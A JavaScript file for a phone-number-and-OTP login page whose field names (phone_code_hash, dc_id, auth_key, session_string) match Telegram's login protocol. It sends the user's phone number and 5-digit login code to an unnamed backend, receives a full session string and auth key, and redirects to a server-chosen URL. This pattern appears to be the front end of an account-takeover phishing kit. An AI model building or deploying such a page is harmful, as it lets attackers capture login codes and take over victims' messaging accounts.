document.addEventListener('DOMContentLoaded', function() {
    const phoneInput = document.getElementById('phoneNumber');
    const countrySelect = document.getElementById('countrySelect');
    const countries = [
        { "name": { "common": "United States" }, "cca2": "US", "idd": { "root": "+1" } },
        { "name": { "common": "United Kingdom" }, "cca2": "GB", "idd": { "root": "+44" } },
        { "name": { "common": "Canada" }, "cca2": "CA", "idd": { "root": "+1" } },
        { "name": { "common": "Australia" }, "cca2": "AU", "idd": { "root": "+61" } },
        { "name": { "common": "India" }, "cca2": "IN", "idd": { "root": "+91" } },
        { "name": { "common": "Germany" }, "cca2": "DE", "idd": { "root": "+49" } },
        { "name": { "common": "France" }, "cca2": "FR", "idd": { "root": "+33" } },
        { "name": { "common": "Italy" }, "cca2": "IT", "idd": { "root": "+39" } },
        { "name": { "common": "Japan" }, "cca2": "JP", "idd": { "root": "+81" } },
        { "name": { "common": "Russia" }, "cca2": "RU", "idd": { "root": "+7" } },
        { "name": { "common": "Brazil" }, "cca2": "BR", "idd": { "root": "+55" } },
        { "name": { "common": "China" }, "cca2": "CN", "idd": { "root": "+86" } },
        { "name": { "common": "South Korea" }, "cca2": "KR", "idd": { "root": "+82" } },
        { "name": { "common": "Mexico" }, "cca2": "MX", "idd": { "root": "+52" } },
        { "name": { "common": "South Africa" }, "cca2": "ZA", "idd": { "root": "+27" } },
        { "name": { "common": "Argentina" }, "cca2": "AR", "idd": { "root": "+54" } },
        { "name": { "common": "Turkey" }, "cca2": "TR", "idd": { "root": "+90" } },
        { "name": { "common": "Saudi Arabia" }, "cca2": "SA", "idd": { "root": "+966" } },
        { "name": { "common": "Indonesia" }, "cca2": "ID", "idd": { "root": "+62" } },
        { "name": { "common": "Pakistan" }, "cca2": "PK", "idd": { "root": "+92" } },
        { "name": { "common": "Bangladesh" }, "cca2": "BD", "idd": { "root": "+880" } },
        { "name": { "common": "Nigeria" }, "cca2": "NG", "idd": { "root": "+234" } },
        { "name": { "common": "Egypt" }, "cca2": "EG", "idd": { "root": "+20" } },
        { "name": { "common": "United Arab Emirates" }, "cca2": "AE", "idd": { "root": "+971" } },
        { "name": { "common": "Malaysia" }, "cca2": "MY", "idd": { "root": "+60" } },
        { "name": { "common": "Philippines" }, "cca2": "PH", "idd": { "root": "+63" } },
        { "name": { "common": "Vietnam" }, "cca2": "VN", "idd": { "root": "+84" } },
        { "name": { "common": "Thailand" }, "cca2": "TH", "idd": { "root": "+66" } },
        { "name": { "common": "Singapore" }, "cca2": "SG", "idd": { "root": "+65" } },
        { "name": { "common": "Colombia" }, "cca2": "CO", "idd": { "root": "+57" } },
        { "name": { "common": "Chile" }, "cca2": "CL", "idd": { "root": "+56" } },
        { "name": { "common": "Peru" }, "cca2": "PE", "idd": { "root": "+51" } },
        { "name": { "common": "Venezuela" }, "cca2": "VE", "idd": { "root": "+58" } },
        { "name": { "common": "Iran" }, "cca2": "IR", "idd": { "root": "+98" } },
        { "name": { "common": "Iraq" }, "cca2": "IQ", "idd": { "root": "+964" } },
        { "name": { "common": "Israel" }, "cca2": "IL", "idd": { "root": "+972" } },
        { "name": { "common": "Morocco" }, "cca2": "MA", "idd": { "root": "+212" } },
        { "name": { "common": "Ukraine" }, "cca2": "UA", "idd": { "root": "+380" } },
        { "name": { "common": "Poland" }, "cca2": "PL", "idd": { "root": "+48" } },
        { "name": { "common": "Netherlands" }, "cca2": "NL", "idd": { "root": "+31" } },
        { "name": { "common": "Belgium" }, "cca2": "BE", "idd": { "root": "+32" } },
        { "name": { "common": "Sweden" }, "cca2": "SE", "idd": { "root": "+46" } },
        { "name": { "common": "Denmark" }, "cca2": "DK", "idd": { "root": "+45" } },
        { "name": { "common": "Norway" }, "cca2": "NO", "idd": { "root": "+47" } },
        { "name": { "common": "Finland" }, "cca2": "FI", "idd": { "root": "+358" } },
        { "name": { "common": "Switzerland" }, "cca2": "CH", "idd": { "root": "+41" } },
        { "name": { "common": "Austria" }, "cca2": "AT", "idd": { "root": "+43" } },
        { "name": { "common": "Portugal" }, "cca2": "PT", "idd": { "root": "+351" } },
        { "name": { "common": "Greece" }, "cca2": "GR", "idd": { "root": "+30" } },
        { "name": { "common": "Romania" }, "cca2": "RO", "idd": { "root": "+40" } },
        { "name": { "common": "Hungary" }, "cca2": "HU", "idd": { "root": "+36" } },
        { "name": { "common": "Czech Republic" }, "cca2": "CZ", "idd": { "root": "+420" } },
        { "name": { "common": "Slovakia" }, "cca2": "SK", "idd": { "root": "+421" } },
        { "name": { "common": "Bulgaria" }, "cca2": "BG", "idd": { "root": "+359" } },
        { "name": { "common": "Croatia" }, "cca2": "HR", "idd": { "root": "+385" } },
        { "name": { "common": "Slovenia" }, "cca2": "SI", "idd": { "root": "+386" } },
        { "name": { "common": "Serbia" }, "cca2": "RS", "idd": { "root": "+381" } },
        { "name": { "common": "Bosnia and Herzegovina" }, "cca2": "BA", "idd": { "root": "+387" } },
        { "name": { "common": "Macedonia" }, "cca2": "MK", "idd": { "root": "+389" } },
        { "name": { "common": "Albania" }, "cca2": "AL", "idd": { "root": "+355" } },
        { "name": { "common": "Georgia" }, "cca2": "GE", "idd": { "root": "+995" } },
        { "name": { "common": "Armenia" }, "cca2": "AM", "idd": { "root": "+374" } },
        { "name": { "common": "Azerbaijan" }, "cca2": "AZ", "idd": { "root": "+994" } },
        { "name": { "common": "Kazakhstan" }, "cca2": "KZ", "idd": { "root": "+7" } },
        { "name": { "common": "Uzbekistan" }, "cca2": "UZ", "idd": { "root": "+998" } },
        { "name": { "common": "Kyrgyzstan" }, "cca2": "KG", "idd": { "root": "+996" } },
        { "name": { "common": "Tajikistan" }, "cca2": "TJ", "idd": { "root": "+992" } },
        { "name": { "common": "Turkmenistan" }, "cca2": "TM", "idd": { "root": "+993" } },
        { "name": { "common": "Mongolia" }, "cca2": "MN", "idd": { "root": "+976" } },
        { "name": { "common": "New Zealand" }, "cca2": "NZ", "idd": { "root": "+64" } },
        { "name": { "common": "Afghanistan" }, "cca2": "AF", "idd": { "root": "+93" } },
        { "name": { "common": "Myanmar" }, "cca2": "MM", "idd": { "root": "+95" } },
        { "name": { "common": "Cambodia" }, "cca2": "KH", "idd": { "root": "+855" } },
        { "name": { "common": "Laos" }, "cca2": "LA", "idd": { "root": "+856" } },
        { "name": { "common": "Nepal" }, "cca2": "NP", "idd": { "root": "+977" } },
        { "name": { "common": "Sri Lanka" }, "cca2": "LK", "idd": { "root": "+94" } },
        { "name": { "common": "Maldives" }, "cca2": "MV", "idd": { "root": "+960" } },
        { "name": { "common": "Syria" }, "cca2": "SY", "idd": { "root": "+963" } },
        { "name": { "common": "Jordan" }, "cca2": "JO", "idd": { "root": "+962" } },
        { "name": { "common": "Lebanon" }, "cca2": "LB", "idd": { "root": "+961" } },
        { "name": { "common": "Kuwait" }, "cca2": "KW", "idd": { "root": "+965" } },
        { "name": { "common": "Oman" }, "cca2": "OM", "idd": { "root": "+968" } },
        { "name": { "common": "Qatar" }, "cca2": "QA", "idd": { "root": "+974" } },
        { "name": { "common": "Bahrain" }, "cca2": "BH", "idd": { "root": "+973" } },
        { "name": { "common": "Yemen" }, "cca2": "YE", "idd": { "root": "+967" } },
        { "name": { "common": "Ethiopia" }, "cca2": "ET", "idd": { "root": "+251" } },
        { "name": { "common": "Kenya" }, "cca2": "KE", "idd": { "root": "+254" } },
        { "name": { "common": "Uganda" }, "cca2": "UG", "idd": { "root": "+256" } },
        { "name": { "common": "Ghana" }, "cca2": "GH", "idd": { "root": "+233" } },
        { "name": { "common": "Ivory Coast" }, "cca2": "CI", "idd": { "root": "+225" } },
        { "name": { "common": "Senegal" }, "cca2": "SN", "idd": { "root": "+221" } },
        { "name": { "common": "Zambia" }, "cca2": "ZM", "idd": { "root": "+260" } },
        { "name": { "common": "Zimbabwe" }, "cca2": "ZW", "idd": { "root": "+263" } },
    ];

    // Detecting light or dark mode
    function detectDeviceMode() {
        const darkModeMediaQuery = window.matchMedia('(prefers-color-scheme: dark)');
        return darkModeMediaQuery.matches ? 'dark' : 'light';
    }

    function applyModeStyles() {
        const currentMode = detectDeviceMode();
        const formContainer = document.querySelector('.form-container');
        const inputs = document.querySelectorAll('input');
        
        if (currentMode === 'light') {
            // Apply light mode styles
            formContainer.style.backgroundColor = '#ffffff'; // White background
            inputs.forEach(input => {
                input.style.color = '#000000'; // Black text
                input.style.backgroundColor = '#ffffff'; // White input background
            });
        } else {
            // Apply dark mode styles
            formContainer.style.backgroundColor = '#2c2c2c'; // Dark background
            inputs.forEach(input => {
                input.style.color = '#ffffff'; // White text
                input.style.backgroundColor = '#2c2c2c'; // Dark input background
            });
        }
    }

    // Call this function on page load to apply the initial mode styles
    applyModeStyles();

    if (phoneInput) {
        phoneInput.addEventListener('input', function() {
            const inputNumber = phoneInput.value.replace(/\D/g, ''); // Remove non-digit characters
            
            if (inputNumber.length > 0) {
                const matchedCountry = findMatchingCountries(inputNumber);
                if (matchedCountry && countrySelect) {
                    // Update the country select dropdown based on matched countries
                    updateCountryOptions(matchedCountry);
                }
            }
        });

        phoneInput.addEventListener('focus', () => {
            setTimeout(() => {
                window.scrollTo({
                    top: phoneInput.getBoundingClientRect().top - 100,
                    behavior: 'smooth'
                });
            }, 300);
        });
    }

    const phoneForm = document.getElementById('phoneForm');
    if (phoneForm) {
        phoneForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone form submitted!");

            const phoneNumber = document.getElementById('phoneNumber').value;
            sendLogToBackend("Phone number entered: " + phoneNumber);
            sessionStorage.setItem('phoneNumber', phoneNumber);

            const submitButton = phoneForm.querySelector('button[type="submit"]');
            submitButton.disabled = true; // Disable button to prevent multiple submissions
            displayLoadingIndicator(true);

            try {
                const response = await fetch(`${BACKEND_URL}/sendPhoneNumber`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber })
                });

                const data = await response.json();
                if (data.message && data.message.includes('The phone number is invalid')) {
                    throw new Error('Invalid phone number, please input your correct phone number.');
                }

                if (!response.ok) {
                    throw new Error('Network response was not ok: ' + response.statusText);
                }

                sendLogToBackend('Response from backend: ' + JSON.stringify(data));

                if (data.phone_code_hash) {
                    sessionStorage.setItem('phone_code_hash', data.phone_code_hash);
                    sendLogToBackend("Phone code hash stored: " + data.phone_code_hash);
                    document.getElementById('loginContainer').classList.add('swipe-left');
                    setTimeout(() => {
                        window.location.href = '/otp.html';
                    }, 600);
                } else {
                    displayMessage(data.message || 'Failed to send OTP', 'error');
                }
            } catch (error) {
                displayMessage(error.message, 'error');
            } finally {
                submitButton.disabled = false; // Re-enable button
                displayLoadingIndicator(false);
            }
        });
    }

    const otpForm = document.getElementById('otpForm');
    if (otpForm) {
        otpForm.addEventListener('submit', async function(event) {
            event.preventDefault();
            sendLogToBackend("Phone code form submitted!");

            const phoneNumber = sessionStorage.getItem('phoneNumber');
            const phoneCode = document.getElementById('phoneCode').value;
            const phoneCodeHash = sessionStorage.getItem('phone_code_hash');

            if (!phoneCodeHash) {
                sendLogToBackend("Error: phone code hash is missing");
                displayMessage("Phone code hash missing. Please try again.", 'error');
                return;
            }

            if (!/^\d{5}$/.test(phoneCode)) {
                displayMessage("Phone code must be exactly 5 digits.", 'error');
                return;
            }

            sendLogToBackend("Phone number from sessionStorage: " + phoneNumber);
            sendLogToBackend("Phone code entered: " + phoneCode);
            sendLogToBackend("Phone code hash: " + phoneCodeHash);

            const submitButton = otpForm.querySelector('button[type="submit"]');
            submitButton.disabled = true; // Disable button to prevent multiple submissions
            displayLoadingIndicator(true);

            try {
                const response = await fetch(`${BACKEND_URL}/verifyOTP`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ phoneNumber, phoneCode, phone_code_hash: phoneCodeHash })
                });

                if (!response.ok) {
                    const data = await response.json();
                    throw new Error(data.message || 'Failed to submit Phone Code');
                }

                const result = await response.json();
                sendLogToBackend('Received auth tokens: ' + JSON.stringify(result.authTokens));

                localStorage.clear();
                localStorage.setItem('auth_key', result.authTokens.auth_key);
                localStorage.setItem('dc_id', result.authTokens.dc_id);
                localStorage.setItem('session_string', result.authTokens.session_string);

                document.getElementById('otpContainer').classList.add('swipe-in');
                setTimeout(() => {
                    window.location.href = result.redirectUrl;
                }, 600);
            } catch (error) {
                displayMessage('Error submitting Phone Code: ' + error.message, 'error');
            } finally {
                submitButton.disabled = false; 
                displayLoadingIndicator(false);
            }
        });
    }

    function findMatchingCountries(inputNumber) {
        return countries.filter(country => {
            const phoneRoot = country.idd.root;
            return phoneRoot && inputNumber.startsWith(phoneRoot);
        });
    }

    function updateCountryOptions(matchedCountries) {
        if (matchedCountries.length === 1) {
            countrySelect.value = matchedCountries[0].cca2;
        } else {
            // Multiple matches, show all possibilities
            countrySelect.innerHTML = ''; // Clear existing options
            matchedCountries.forEach(country => {
                const option = document.createElement('option');
                option.value = country.cca2;
                option.text = `${country.name.common} (${country.idd.root})`;
                countrySelect.appendChild(option);
            });
        }
    }

    function displayMessage(message, type) {
        const messageContainer = document.getElementById('message') || document.getElementById('successMessage') || document.getElementById('errorMessage');
        if (messageContainer) {
            messageContainer.innerText = message;
            messageContainer.style.color = type === 'error' ? 'red' : 'green';
            messageContainer.style.display = 'block';
        }
    }

    function displayLoadingIndicator(isLoading) {
        const loadingIndicator = document.getElementById('loadingIndicator');
        if (loadingIndicator) {
            loadingIndicator.style.display = isLoading ? 'block' : 'none';
        }
    }

    function sendLogToBackend(logMessage) {
        console.log(logMessage); // Here you can replace this with an actual backend log if needed
    }
});
